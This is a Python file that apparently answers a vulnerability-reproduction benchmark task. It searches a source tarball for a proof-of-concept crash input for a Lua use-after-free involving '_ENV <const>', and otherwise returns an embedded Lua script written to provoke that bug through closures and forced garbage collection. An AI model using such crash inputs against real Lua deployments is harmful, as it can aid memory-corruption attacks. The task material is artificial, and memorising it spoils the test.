import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            poc = self._find_poc_in_tar(src_path)
            if poc is not None:
                return poc
        except Exception:
            pass
        return self._fallback_poc()

    def _find_poc_in_tar(self, src_path: str) -> bytes | None:
        if not os.path.isfile(src_path):
            return None

        best_score = -1
        best_data = None

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    if member.size == 0:
                        continue

                    # Limit very large files: read at most 512 KiB
                    max_read = 512 * 1024
                    to_read = min(member.size, max_read)

                    try:
                        f = tf.extractfile(member)
                        if f is None:
                            continue
                        data = f.read(to_read)
                    except Exception:
                        continue

                    if not data:
                        continue

                    # Quick filter: require "<const" or "_ENV" to appear
                    if b"<const" not in data and b"_ENV" not in data and b"_env" not in data:
                        continue

                    lower_data = data.lower()
                    path_lower = member.name.lower()

                    score = 0

                    # Path-based hints
                    for kw, val in (
                        ("poc", 30),
                        ("uaf", 25),
                        ("use_after_free", 25),
                        ("use-after-free", 25),
                        ("asan", 15),
                        ("fuzz", 10),
                        ("crash", 20),
                        ("bug", 10),
                        ("regress", 20),
                        ("test", 8),
                        ("tests", 8),
                        ("example", 5),
                        ("repro", 20),
                    ):
                        if kw in path_lower:
                            score += val

                    # Content-based hints
                    if b"local _ENV <const>" in data or b"local\t_ENV\t<const>" in data:
                        score += 120
                    elif b"_ENV <const>" in data:
                        score += 90
                    elif b"<const>" in data and (b"_ENV" in data or b"_env" in lower_data):
                        score += 60

                    for kw, val in (
                        (b"heap-use-after-free", 40),
                        (b"use-after-free", 35),
                        (b"use after free", 35),
                        (b"uaf", 10),
                        (b"addressesanitizer", 10),
                        (b"asan", 5),
                    ):
                        if kw in lower_data:
                            score += val

                    # Slight preference for likely Lua sources
                    if member.name.endswith(".lua"):
                        score += 10

                    if score > best_score:
                        best_score = score
                        best_data = data

        except Exception:
            return None

        # Require at least some minimal confidence
        if best_data is not None and best_score > 0:
            return best_data
        return None

    def _fallback_poc(self) -> bytes:
        # Generic PoC attempting to exercise Lua's handling of _ENV declared as <const>
        # with nested functions and garbage collection.
        script = r'''
-- Fallback PoC for Lua _ENV <const> issue.
-- This script intentionally stresses nested scopes, closures, and _ENV as <const>.

local ORIGINAL_ENV = _G or _ENV

local _ENV <const> = {
    print          = ORIGINAL_ENV.print,
    setmetatable   = ORIGINAL_ENV.setmetatable,
    getmetatable   = ORIGINAL_ENV.getmetatable,
    collectgarbage = ORIGINAL_ENV.collectgarbage,
    tostring       = ORIGINAL_ENV.tostring,
    ipairs         = ORIGINAL_ENV.ipairs,
    pairs          = ORIGINAL_ENV.pairs,
    type           = ORIGINAL_ENV.type,
    error          = ORIGINAL_ENV.error,
    tonumber       = ORIGINAL_ENV.tonumber,
}

local function make_env_with_gc(id)
    local t = {}
    local function finalizer()
        -- Trigger more allocations and collections while this environment
        -- might still be referenced somewhere.
        for i = 1, 5 do
            local tmp = {}
            tmp[i] = i * id
        end
        collectgarbage("collect")
    end
    setmetatable(t, { __gc = finalizer })
    return t
end

local function make_closure(index)
    -- Inner environment that shadows the outer _ENV and is const.
    local inner_env <const> = make_env_with_gc(index)

    local _ENV <const> = {
        print          = print,
        tostring       = tostring,
        collectgarbage = collectgarbage,
        index          = index,
        inner_env      = inner_env,
    }

    local function deep(n, acc)
        if n == 0 then
            return tostring(index) .. ":" .. tostring(acc)
        end
        -- Mix access to values potentially coming from a const _ENV.
        return deep(n - 1, (acc * 1664525 + index) % 4294967296)
    end

    local function use_env()
        -- Touch fields from the inner environment in a non-trivial way.
        local sum = 0
        for k, v in pairs(inner_env) do
            if type(k) == "number" and type(v) == "number" then
                sum = sum + k + v
            end
        end
        return deep(3, sum)
    end

    return use_env
end

local function build_closures(count)
    local closures = {}
    for i = 1, count do
        closures[i] = make_closure(i)
    end
    -- Encourage collection of temporary objects.
    collectgarbage("collect")
    collectgarbage("collect")
    return closures
end

local closures = build_closures(16)

for round = 1, 32 do
    for i, fn in ipairs(closures) do
        local ok, res = pcall(fn)
        if not ok then
            error("closure failed: " .. tostring(res))
        end
        if round == 1 and i <= 4 then
            print("result", i, res)
        end
    end
    if round % 4 == 0 then
        collectgarbage("collect")
    end
end

'''
        return script.encode("utf-8")